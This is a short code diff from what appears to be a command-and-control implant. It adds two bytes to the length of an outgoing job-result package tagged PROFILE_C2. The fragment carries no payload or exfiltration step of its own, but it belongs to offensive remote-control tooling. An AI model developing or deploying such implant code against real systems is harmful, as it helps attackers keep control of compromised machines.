@@ -88,7 +88,7 @@ auto DECLFN Jobs::Send(
 
             MsgLen = MsgLen ? MsgLen : Str::LengthA( Unknown );
 
-            ULONG PkgLen = MsgLen + 40 + sizeof( INT16 ) + sizeof( INT32 );
+            ULONG PkgLen = MsgLen + 2 + 40 + sizeof( INT16 ) + sizeof( INT32 );
 
             Self->Pkg->Int32( PostJobs, PROFILE_C2 );
             Self->Pkg->Int32( PostJobs, PkgLen );
